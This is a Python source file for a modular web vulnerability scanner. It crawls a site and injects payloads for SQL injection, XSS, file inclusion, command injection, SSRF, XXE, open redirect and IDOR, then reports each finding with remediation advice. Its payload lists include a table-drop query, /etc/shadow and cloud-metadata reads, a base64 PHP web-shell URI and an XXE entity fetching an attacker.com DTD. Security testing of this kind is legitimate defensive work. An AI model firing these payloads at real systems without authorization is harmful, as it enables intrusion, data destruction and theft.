"""
Web Vulnerability Scanner
Modular web vulnerability detection engine.

Supported modules:
  sqli   — SQL Injection (error-based, boolean-blind, time-based)
  xss    — Cross-Site Scripting (reflected, stored, DOM)
  lfi    — Local File Inclusion / Path Traversal
  rce    — Remote Code Execution
  ssrf   — Server-Side Request Forgery
  xxe    — XML External Entity Injection
  csrf   — Cross-Site Request Forgery detection
  idor   — Insecure Direct Object Reference
  redirect — Open Redirect
  headers — Security header misconfigurations
"""

import re
import urllib.parse
import json
import time
import hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed
from utils.logger import get_logger
from utils.http_client import HTTPClient
from utils.crawler import Crawler

# ── Payload Libraries ──────────────────────────────────────────────────────────

SQLI_PAYLOADS = {
    "error_based": [
        "'",
        "''",
        "`",
        "';",
        "1' OR '1'='1",
        "1' OR '1'='1'--",
        "1' OR '1'='1'#",
        "' OR 1=1--",
        "' OR 1=1#",
        "admin'--",
        "1 UNION SELECT NULL--",
        "1 UNION SELECT NULL,NULL--",
        "1 UNION SELECT NULL,NULL,NULL--",
        "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
        "'; EXEC xp_cmdshell('whoami')--",
        "1; DROP TABLE users--",
    ],
    "blind_boolean": [
        "1 AND 1=1",
        "1 AND 1=2",
        "' AND '1'='1",
        "' AND '1'='2",
        "1 AND SUBSTRING(version(),1,1)='5'",
    ],
    "time_based": [
        "'; WAITFOR DELAY '0:0:5'--",
        "' OR SLEEP(5)--",
        "1; SELECT SLEEP(5)--",
        "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "' AND BENCHMARK(5000000,MD5(1))--",
    ],
}

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>",
    "'\"><script>alert(document.domain)</script>",
    "<body onload=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "'-alert(1)-'",
    "\"><img src=/ onerror=alert(1)>",
    "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
    "<form><button formaction=javascript:alert(1)>CLICK",
]

LFI_PAYLOADS = [
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "../../Windows/win.ini",
    "../../Windows/System32/drivers/etc/hosts",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://input",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
    "file:///etc/passwd",
]

RCE_PAYLOADS = [
    "; whoami",
    "| whoami",
    "& whoami",
    "; id",
    "| id",
    "; ls -la",
    "| ls -la",
    "`whoami`",
    "$(whoami)",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "%0a whoami",
    "%0a id",
    "; ping -c 1 127.0.0.1",
    "1; system('id')",
    "'; exec('id')--",
]

SSRF_PAYLOADS = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://0.0.0.0/",
    "http://169.254.169.254/",
    "http://169.254.169.254/latest/meta-data/",
    "http://[::1]/",
    "http://2130706433/",
    "http://017700000001/",
    "http://0177.0.0.1/",
    "file:///etc/passwd",
    "dict://127.0.0.1:6379/info",
    "gopher://127.0.0.1:25/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",
]

XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/hosts">]><data>&file;</data>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><foo/>',
]

SQLI_ERROR_PATTERNS = [
    r"sql syntax",
    r"mysql_fetch",
    r"ORA-\d{5}",
    r"ODBC.*SQL",
    r"SQLite",
    r"syntax error.*SQL",
    r"pg_query\(\)",
    r"Warning.*mysql_",
    r"valid MySQL result",
    r"MySqlException",
    r"Microsoft JET Database",
    r"ADODB.Field error",
    r"Unclosed quotation mark",
    r"quoted string not properly terminated",
]

LFI_SUCCESS_PATTERNS = [
    r"root:.*:0:0:",
    r"\[extensions\]",
    r"\[fonts\]",
    r"for 16-bit app support",
    r"# /etc/hosts",
]

RCE_SUCCESS_PATTERNS = [
    r"uid=\d+\(",
    r"root:x:",
    r"total \d+",
    r"drwxr",
]


class WebVulnScanner:
    """Modular web vulnerability scanner."""

    DEFAULT_MODULES = ["sqli", "xss", "lfi", "rce", "ssrf", "xxe", "csrf", "headers", "redirect"]

    def __init__(
        self,
        target: str,
        timeout: int = 10,
        threads: int = 20,
        depth: int = 3,
        modules: list = None,
        cookies: dict = None,
        headers: dict = None,
        proxy: str = None,
        wordlist: str = None,
        rate_limit: float = 0,
        verify_ssl: bool = False,
        verbose: bool = False,
    ):
        self.target = target.rstrip("/")
        self.timeout = timeout
        self.threads = threads
        self.depth = depth
        self.modules = modules or self.DEFAULT_MODULES
        self.cookies = cookies or {}
        self.custom_headers = headers or {}
        self.proxy = proxy
        self.wordlist = wordlist
        self.rate_limit = rate_limit
        self.logger = get_logger(verbose=verbose)
        self.http = HTTPClient(
            timeout=timeout,
            verify_ssl=verify_ssl,
            cookies=cookies,
            headers=headers,
            proxy=proxy,
        )
        self.vulnerabilities = []
        self.crawled_urls = set()
        self.forms = []

    def scan(self) -> list:
        """Run all selected vulnerability modules."""
        self.logger.info(f"  [*] Starting web scan: {self.target}")
        self.logger.info(f"  [*] Active modules: {', '.join(self.modules)}")

        # Phase 1: Crawl target for URLs and forms
        self.logger.info("  [*] Crawling target...")
        crawler = Crawler(self.http, depth=self.depth)
        self.crawled_urls, self.forms = crawler.crawl(self.target)
        self.logger.info(f"  [+] Discovered {len(self.crawled_urls)} URLs, {len(self.forms)} forms")

        # Phase 2: Run each module
        module_map = {
            "sqli":     self._test_sqli,
            "xss":      self._test_xss,
            "lfi":      self._test_lfi,
            "rce":      self._test_rce,
            "ssrf":     self._test_ssrf,
            "xxe":      self._test_xxe,
            "csrf":     self._test_csrf,
            "headers":  self._test_headers,
            "redirect": self._test_open_redirect,
            "idor":     self._test_idor,
        }

        for module in self.modules:
            if module in module_map:
                self.logger.info(f"  [*] Running module: {module.upper()}")
                try:
                    module_map[module]()
                except Exception as e:
                    self.logger.debug(f"  [!] Module {module} error: {e}")

        return self.vulnerabilities

    def _add_vuln(self, vuln_type: str, url: str, param: str, payload: str,
                  evidence: str, severity: str, description: str, remediation: str):
        """Record a discovered vulnerability."""
        vuln = {
            "type": vuln_type,
            "url": url,
            "parameter": param,
            "payload": payload,
            "evidence": evidence[:200] if evidence else "",
            "severity": severity,
            "description": description,
            "remediation": remediation,
            "source": "web_scan",
            "id": hashlib.md5(f"{vuln_type}{url}{param}{payload}".encode()).hexdigest()[:8],
        }
        self.vulnerabilities.append(vuln)
        self.logger.info(
            f"  [{severity.upper()}] {vuln_type} @ {url} param={param}"
        )

    def _extract_params(self, url: str) -> dict:
        """Extract query parameters from URL."""
        parsed = urllib.parse.urlparse(url)
        return dict(urllib.parse.parse_qsl(parsed.query))

    def _inject_param(self, url: str, param: str, payload: str) -> str:
        """Inject a payload into a specific URL parameter."""
        parsed = urllib.parse.urlparse(url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        params[param] = payload
        new_query = urllib.parse.urlencode(params)
        return parsed._replace(query=new_query).geturl()

    # ── Module: SQL Injection ──────────────────────────────────────────────────

    def _test_sqli(self):
        urls_with_params = [u for u in self.crawled_urls if "?" in u]
        for url in urls_with_params:
            params = self._extract_params(url)
            for param in params:
                self._sqli_error_based(url, param)
                self._sqli_time_based(url, param)

        # Also test forms
        for form in self.forms:
            for field in form.get("inputs", []):
                if field.get("type") not in ("submit", "hidden", "file"):
                    self._sqli_form(form, field["name"])

    def _sqli_error_based(self, url: str, param: str):
        for payload in SQLI_PAYLOADS["error_based"]:
            try:
                test_url = self._inject_param(url, param, payload)
                resp = self.http.get(test_url)
                for pattern in SQLI_ERROR_PATTERNS:
                    if re.search(pattern, resp.text, re.IGNORECASE):
                        self._add_vuln(
                            "SQL Injection (Error-Based)", url, param, payload,
                            re.search(pattern, resp.text, re.IGNORECASE).group(0),
                            "critical",
                            f"Error-based SQL injection detected in parameter '{param}'.",
                            "Use parameterized queries / prepared statements. Never concatenate user input into SQL.",
                        )
                        return  # One confirmation per param is enough
                if self.rate_limit:
                    time.sleep(self.rate_limit)
            except Exception:
                continue

    def _sqli_time_based(self, url: str, param: str):
        for payload in SQLI_PAYLOADS["time_based"]:
            try:
                test_url = self._inject_param(url, param, payload)
                start = time.time()
                self.http.get(test_url)
                elapsed = time.time() - start
                if elapsed >= 4.5:
                    self._add_vuln(
                        "SQL Injection (Time-Based Blind)", url, param, payload,
                        f"Response delayed {elapsed:.1f}s with SLEEP/WAITFOR payload",
                        "critical",
                        f"Time-based blind SQL injection detected — parameter '{param}' delayed {elapsed:.1f}s.",
                        "Use parameterized queries. Avoid dynamic SQL construction.",
                    )
                    return
                if self.rate_limit:
                    time.sleep(self.rate_limit)
            except Exception:
                continue

    def _sqli_form(self, form: dict, field_name: str):
        for payload in SQLI_PAYLOADS["error_based"][:5]:
            try:
                data = {inp["name"]: inp.get("value", "test") for inp in form.get("inputs", [])}
                data[field_name] = payload
                resp = self.http.post(form["action"], data=data)
                for pattern in SQLI_ERROR_PATTERNS:
                    if re.search(pattern, resp.text, re.IGNORECASE):
                        self._add_vuln(
                            "SQL Injection (Form)", form["action"], field_name, payload,
                            re.search(pattern, resp.text, re.IGNORECASE).group(0),
                            "critical",
                            f"SQL injection in form field '{field_name}' at {form['action']}",
                            "Use parameterized queries / prepared statements.",
                        )
                        return
            except Exception:
                continue

    # ── Module: Cross-Site Scripting ───────────────────────────────────────────

    def _test_xss(self):
        urls_with_params = [u for u in self.crawled_urls if "?" in u]
        for url in urls_with_params:
            params = self._extract_params(url)
            for param in params:
                self._xss_reflected(url, param)

        for form in self.forms:
            for field in form.get("inputs", []):
                if field.get("type") not in ("submit", "hidden", "file"):
                    self._xss_form(form, field["name"])

    def _xss_reflected(self, url: str, param: str):
        unique = f"vulnscan_{hashlib.md5(url.encode()).hexdigest()[:6]}"
        for payload in XSS_PAYLOADS[:8]:
            try:
                modified_payload = payload.replace("alert(1)", f"alert('{unique}')")
                test_url = self._inject_param(url, param, modified_payload)
                resp = self.http.get(test_url)
                if modified_payload in resp.text or unique in resp.text:
                    self._add_vuln(
                        "Cross-Site Scripting (Reflected)", url, param, payload,
                        f"Payload reflected unencoded in response",
                        "high",
                        f"Reflected XSS in parameter '{param}' — user input rendered without encoding.",
                        "HTML-encode all user-controlled output. Implement a strict Content Security Policy.",
                    )
                    return
                if self.rate_limit:
                    time.sleep(self.rate_limit)
            except Exception:
                continue

    def _xss_form(self, form: dict, field_name: str):
        unique = f"vulnscan_{hashlib.md5(form['action'].encode()).hexdigest()[:6]}"
        for payload in XSS_PAYLOADS[:5]:
            try:
                data = {inp["name"]: inp.get("value", "test") for inp in form.get("inputs", [])}
                data[field_name] = payload.replace("alert(1)", f"alert('{unique}')")
                resp = self.http.post(form["action"], data=data)
                if unique in resp.text:
                    self._add_vuln(
                        "Cross-Site Scripting (Form)", form["action"], field_name, payload,
                        "XSS payload reflected in response",
                        "high",
                        f"XSS via form field '{field_name}'",
                        "HTML-encode all output. Use a CSP header.",
                    )
                    return
            except Exception:
                continue

    # ── Module: Local File Inclusion ───────────────────────────────────────────

    def _test_lfi(self):
        urls_with_params = [u for u in self.crawled_urls if "?" in u]
        for url in urls_with_params:
            params = self._extract_params(url)
            for param in params:
                if any(kw in param.lower() for kw in ["file", "path", "page", "include", "dir", "doc", "view", "load"]):
                    for payload in LFI_PAYLOADS:
                        try:
                            test_url = self._inject_param(url, param, payload)
                            resp = self.http.get(test_url)
                            for pattern in LFI_SUCCESS_PATTERNS:
                                if re.search(pattern, resp.text, re.IGNORECASE):
                                    self._add_vuln(
                                        "Local File Inclusion", url, param, payload,
                                        re.search(pattern, resp.text).group(0),
                                        "critical",
                                        f"LFI/Path traversal in '{param}' — able to read server files.",
                                        "Whitelist allowed filenames. Never pass user-supplied paths to file functions.",
                                    )
                                    break
                            if self.rate_limit:
                                time.sleep(self.rate_limit)
                        except Exception:
                            continue

    # ── Module: Remote Code Execution ─────────────────────────────────────────

    def _test_rce(self):
        urls_with_params = [u for u in self.crawled_urls if "?" in u]
        for url in urls_with_params:
            params = self._extract_params(url)
            for param in params:
                if any(kw in param.lower() for kw in ["cmd", "exec", "command", "run", "shell", "ping", "query"]):
                    for payload in RCE_PAYLOADS:
                        try:
                            test_url = self._inject_param(url, param, payload)
                            resp = self.http.get(test_url)
                            for pattern in RCE_SUCCESS_PATTERNS:
                                if re.search(pattern, resp.text):
                                    self._add_vuln(
                                        "Remote Code Execution", url, param, payload,
                                        re.search(pattern, resp.text).group(0),
                                        "critical",
                                        f"RCE detected in '{param}' — OS command output returned.",
                                        "Never pass user input to OS command functions. Use allowlists.",
                                    )
                                    break
                            if self.rate_limit:
                                time.sleep(self.rate_limit)
                        except Exception:
                            continue

    # ── Module: SSRF ───────────────────────────────────────────────────────────

    def _test_ssrf(self):
        urls_with_params = [u for u in self.crawled_urls if "?" in u]
        for url in urls_with_params:
            params = self._extract_params(url)
            for param in params:
                if any(kw in param.lower() for kw in ["url", "uri", "redirect", "link", "src", "dest", "callback", "webhook", "fetch"]):
                    for payload in SSRF_PAYLOADS[:6]:
                        try:
                            test_url = self._inject_param(url, param, payload)
                            resp = self.http.get(test_url)
                            if any(indicator in resp.text.lower() for indicator in
                                   ["ami-id", "instance-id", "computeMetadata", "169.254", "localhost", "root:x:"]):
                                self._add_vuln(
                                    "Server-Side Request Forgery (SSRF)", url, param, payload,
                                    "Internal resource accessed via SSRF",
                                    "critical",
                                    f"SSRF in '{param}' — server fetched internal resource.",
                                    "Validate and whitelist allowed URL schemes/hosts. Block internal IP ranges.",
                                )
                                break
                            if self.rate_limit:
                                time.sleep(self.rate_limit)
                        except Exception:
                            continue

    # ── Module: XXE ────────────────────────────────────────────────────────────

    def _test_xxe(self):
        for url in self.crawled_urls:
            for payload in XXE_PAYLOADS:
                try:
                    resp = self.http.post(
                        url, data=payload,
                        headers={"Content-Type": "application/xml"}
                    )
                    if re.search(r"root:.*:0:0:", resp.text) or "127.0.0.1" in resp.text:
                        self._add_vuln(
                            "XML External Entity Injection (XXE)", url, "xml-body", payload,
                            "External entity content included in response",
                            "critical",
                            "XXE injection — XML parser resolves external entities.",
                            "Disable external entity processing in XML parsers. Use safe parser configurations.",
                        )
                        break
                except Exception:
                    continue

    # ── Module: CSRF ───────────────────────────────────────────────────────────

    def _test_csrf(self):
        for form in self.forms:
            if form.get("method", "get").lower() == "post":
                has_token = any(
                    any(kw in inp.get("name", "").lower() for kw in ["csrf", "token", "_token", "nonce", "authenticity"])
                    for inp in form.get("inputs", [])
                )
                if not has_token:
                    self._add_vuln(
                        "Cross-Site Request Forgery (CSRF)", form["action"], "form", "N/A",
                        "No CSRF token found in POST form",
                        "medium",
                        f"POST form at {form['action']} lacks CSRF token.",
                        "Add CSRF tokens (synchronizer token pattern) to all state-changing forms. Use SameSite cookies.",
                    )

    # ── Module: Open Redirect ──────────────────────────────────────────────────

    def _test_open_redirect(self):
        redirect_payloads = [
            "https://evil.com",
            "//evil.com",
            "/\\evil.com",
            "https:evil.com",
        ]
        for url in self.crawled_urls:
            if "?" not in url:
                continue
            params = self._extract_params(url)
            for param in params:
                if any(kw in param.lower() for kw in ["redirect", "url", "next", "return", "goto", "dest", "back"]):
                    for payload in redirect_payloads:
                        try:
                            test_url = self._inject_param(url, param, payload)
                            resp = self.http.get(test_url, allow_redirects=False)
                            if resp.status_code in (301, 302, 303, 307, 308):
                                location = resp.headers.get("Location", "")
                                if "evil.com" in location:
                                    self._add_vuln(
                                        "Open Redirect", url, param, payload,
                                        f"Redirect to: {location}",
                                        "medium",
                                        f"Open redirect via '{param}' parameter.",
                                        "Validate redirect URLs against an allowlist of trusted domains.",
                                    )
                                    break
                        except Exception:
                            continue

    # ── Module: IDOR ───────────────────────────────────────────────────────────

    def _test_idor(self):
        for url in self.crawled_urls:
            params = self._extract_params(url)
            for param, value in params.items():
                if value.isdigit():
                    original_id = int(value)
                    for test_id in [original_id - 1, original_id + 1, original_id + 100]:
                        if test_id > 0:
                            try:
                                original_resp = self.http.get(url)
                                test_url = self._inject_param(url, param, str(test_id))
                                test_resp = self.http.get(test_url)
                                if (test_resp.status_code == 200 and
                                    original_resp.status_code == 200 and
                                    len(test_resp.content) > 100 and
                                    abs(len(test_resp.content) - len(original_resp.content)) > 50):
                                    self._add_vuln(
                                        "Insecure Direct Object Reference (IDOR)", url, param, str(test_id),
                                        f"Different content returned for ID {test_id}",
                                        "high",
                                        f"Possible IDOR in '{param}' — different object accessible by changing ID.",
                                        "Implement proper authorization checks. Use indirect references (UUIDs) instead of sequential IDs.",
                                    )
                                    break
                            except Exception:
                                continue

    # ── Module: Security Headers ───────────────────────────────────────────────

    def _test_headers(self):
        try:
            resp = self.http.get(self.target)
            headers = dict(resp.headers)

            checks = [
                ("Strict-Transport-Security", "critical", "HSTS not implemented",
                 "Add: Strict-Transport-Security: max-age=31536000; includeSubDomains"),
                ("Content-Security-Policy", "high", "Content Security Policy missing",
                 "Implement a strict CSP header to prevent XSS."),
                ("X-Frame-Options", "medium", "Clickjacking protection missing",
                 "Add: X-Frame-Options: DENY or SAMEORIGIN"),
                ("X-Content-Type-Options", "low", "MIME-type sniffing protection absent",
                 "Add: X-Content-Type-Options: nosniff"),
                ("Referrer-Policy", "low", "Referrer-Policy header not set",
                 "Add: Referrer-Policy: no-referrer-when-downgrade"),
                ("Permissions-Policy", "low", "Permissions-Policy header not set",
                 "Restrict browser features via Permissions-Policy."),
            ]

            for header, severity, description, remediation in checks:
                if header not in headers:
                    self._add_vuln(
                        f"Missing Security Header: {header}",
                        self.target, "response-header", "N/A",
                        f"Header '{header}' absent from response",
                        severity, description, remediation,
                    )

            # Check for information disclosure
            for info_header in ["Server", "X-Powered-By", "X-AspNet-Version", "X-Generator"]:
                if info_header in headers:
                    self._add_vuln(
                        "Information Disclosure", self.target, info_header, "N/A",
                        f"{info_header}: {headers[info_header]}",
                        "low",
                        f"Server technology disclosed via {info_header} header.",
                        f"Remove or obfuscate the {info_header} header.",
                    )

        except Exception as e:
            self.logger.debug(f"Header check failed: {e}")
